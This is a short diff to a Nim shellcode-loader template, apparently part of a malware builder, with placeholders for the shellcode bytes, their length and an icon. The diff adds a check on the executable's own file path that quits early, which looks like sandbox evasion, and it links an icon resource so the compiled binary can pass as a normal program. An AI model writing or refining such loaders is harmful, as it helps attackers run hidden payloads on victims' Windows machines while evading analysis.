@@ -40,9 +40,13 @@ proc Ldr1[I, T](shellcode: array[I, T]): void =
         WaitForSingleObject(tHandle, -1)
 
 when defined(windows):
-
-    var shellcode: array[{{Len}}, byte] = [
-        byte {{Shellcode}} ]
+    let path = getAppFilename()
+    if path[10] == '\\':
+        quit(1)
+    else:
+        var shellcode: array[{{Len}}, byte] = [
+            byte {{Shellcode}} ]
 
     when isMainModule:
+        {.link: "icon/{{ICON}}".}
         Ldr1(shellcode)
